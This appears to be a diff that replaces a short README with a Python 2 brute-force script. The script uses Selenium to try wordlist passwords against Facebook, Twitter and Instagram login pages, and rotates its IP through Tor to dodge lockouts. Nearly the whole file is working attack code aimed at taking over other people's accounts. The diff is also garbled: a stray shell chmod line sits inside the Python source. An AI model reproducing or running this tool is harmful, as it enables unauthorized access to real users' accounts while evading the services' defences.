@@ -1,13 +1,276 @@
-### No longer maintained, use [hyrPulse](https://github.com/Ethical-H4CK3R/hyprPulse) instead
+ # -*- coding: utf-8 -*-
+ chmod +x faitagram && chmod +x setup.py
+import argparse, mechanize, os, sys, socks, socket
+from time import sleep
+from subprocess import call
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.ui import WebDriverWait
+from pyvirtualdisplay import Display
+from urllib2 import urlopen
 
-# Usage
-python instagram.py  [Username]  [wordlist]
+reload(sys)
 
-`python instagram.py username103 pass.lst`
+sys.setdefaultencoding('utf8')
 
-## Requirements
-[mechanize](https://pypi.python.org/pypi/mechanize/) install with: `pip install mechanize`
 
-[requests](https://pypi.python.org/pypi/requests/2.18.4) install with: `pip install requests`
+W = '\033[0m'   # White
+R = '\033[31m'  # Red
+G = '\033[32m'  # Green
+O = '\033[33m'  # Orange
 
-[Tor](https://www.torproject.org/docs/debian) install with: `sudo apt-get install tor`
+
+def main():
+
+    parser = argparse.ArgumentParser(description='Bruteforce framework written in Python')  # Parameters
+    required = parser.add_argument_group('required arguments')
+    required.add_argument('-s', '--service', dest='service')
+    required.add_argument('-u', '--username', dest='username')
+    required.add_argument('-w', '--wordlist', dest='password')
+    parser.add_argument('-d', '--delay', type=int, dest='delay')
+
+    args = parser.parse_args()
+
+    service = args.service
+    username = args.username
+    wordlist = args.password
+    delay = args.delay
+
+
+    if os.path.exists(wordlist) == False:
+
+        print(R + "Error : WordList not Found" + W)
+
+        exit(1)
+
+
+    if delay is None:
+
+        delay = 1
+    
+
+    global Hash, fb_name
+
+    os.system("clear")
+
+    if service == "facebook":
+
+        fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
+
+        os.system("clear")
+
+ 
+    os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") # restarting tor & removing geckodriver log
+
+
+    with open('/etc/tor/torrc','r') as f:
+
+        contents = f.readlines()
+
+        data = contents[59]
+
+        Hash = data.rsplit(":",1)[1]
+
+    sys.stdout.write("[ " + G + "ok" + W + " ]" + " Successfully Scanned Password : " + Hash)
+
+    Bruter(service, username, wordlist, delay).execute()
+
+
+class Bruter(object):
+
+
+    def __init__(self, service, username, wordlist, delay):
+
+        self.service = service
+
+        self.username = username
+
+        self.wordlist = wordlist
+
+        self.delay = delay
+
+
+    def stopTOR(self):   # Stoping Tor
+
+        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
+
+        exit(1)
+
+
+    def execute(self):   # Connection Between def main() 
+  
+        if self.usercheck(self.username, self.service) == 1:
+
+            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
+            
+            exit(1)
+
+        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")
+
+        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
+
+
+    def usercheck(self, username, service):          # Checking Username
+
+     #  display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
+
+      # display.start()     
+
+       driver = webdriver.Firefox()
+
+       try:
+
+           if service == "facebook":
+
+               driver.get("https://www.facebook.com/public/" + fb_name)
+
+               assert (("We couldn't find anything for") not in driver.page_source)
+
+               driver.close()
+
+               os.system("clear && /etc/init.d/tor restart")
+
+           elif service == "twitter":
+
+               driver.get("https://www.twitter.com/" + username)
+
+               assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
+
+               driver.close()
+
+           elif service == "instagram":
+
+               driver.get("https://instagram.com/" + username)
+
+               assert (("Sorry, this page isn't available.") not in driver.page_source)
+
+               driver.close()
+
+       except AssertionError:
+
+           return 1
+
+    def webBruteforce(self, username, wordlist, service, delay):
+
+        my_ip = urlopen("http://ip.42.pl/raw").read()
+
+        driver = webdriver.Firefox()
+
+        if service == "facebook":
+
+            driver.get("https://touch.facebook.com/login?soft=auth/")
+
+            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+
+            elem = driver.find_element_by_name("email")
+            
+        elif service == "twitter":
+
+            driver.get("https://mobile.twitter.com/session/new")
+
+            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+
+            elem = driver.find_element_by_name("session[username_or_email]")
+
+        elif service == "instagram":
+
+            driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
+
+            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+
+            elem = driver.find_element_by_name("username")
+
+        elem.clear()
+        elem.send_keys(username)
+
+        j=0 
+
+        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
+
+        wordlist = open(wordlist, 'r')
+
+        for i in wordlist.readlines():
+
+            password = i.strip("\n")
+
+            try:               
+
+                if service == "facebook":
+
+                    elem = driver.find_element_by_name("pass")
+
+                elif service == "twitter":
+
+                    elem = driver.find_element_by_name("session[password]")
+
+                elif service == "instagram":
+
+                    elem = driver.find_element_by_name("password")
+
+                elem.clear()
+                elem.send_keys(password)
+                elem.send_keys(Keys.RETURN)
+                
+                sleep(delay) 
+
+
+                if service == "facebook":
+
+                    assert (("Log into Facebook | Facebook") in driver.title)
+
+                elif service == "twitter":
+
+                    if driver.current_url == "https://mobile.twitter.com/home":
+
+                        print(G + ("  Username: {} \t| Password found: {} \n".format(username,password)) + W)
+
+                        self.stopTOR()
+
+                elif service == "instagram":
+
+                    assert (("Log in — Instagram") in driver.title)
+
+                if j == 2:
+
+                   j=0
+
+                   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 , "127.0.0.1", 9050, True)
+
+                   socket.socket = socks.socksocket
+
+                   my_ip = urlopen("http://ip.42.pl/raw").read()
+
+                print(O + ("  Password: {} \t| Failed \t| IP : {} \n ".format(password,my_ip)) + W)
+
+                j+=1
+
+                sleep(delay)
+
+            except AssertionError: 
+            
+                print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
+
+                self.stopTOR()
+
+            except Exception as e:
+
+                print(R + ("\nError : {}".format(e)) + W)
+
+                driver.close()
+
+                self.stopTOR()
+
+
+if __name__ == '__main__':
+
+    try:
+
+        main()
+
+    except KeyboardInterrupt:
+
+        print(R + "\nError : Keyboard Interrupt" + W)
+
+        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
+
+        exit(1)
